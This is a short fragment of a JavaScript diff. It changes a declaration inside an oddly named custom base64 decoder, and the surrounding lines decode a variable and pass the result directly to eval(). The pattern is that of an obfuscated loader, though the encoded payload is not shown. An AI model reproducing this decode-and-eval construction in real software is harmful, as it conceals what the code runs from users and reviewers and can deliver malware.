@@ -11,7 +11,7 @@ var xotaX = getampas63mais1(viniciusDavid);
 eval(xotaX);
 
 function getampas63mais1(encodedstring) {
-    const base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    var base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     var in_len = encodedstring.length;
     var i = 0;
     var j = 0;
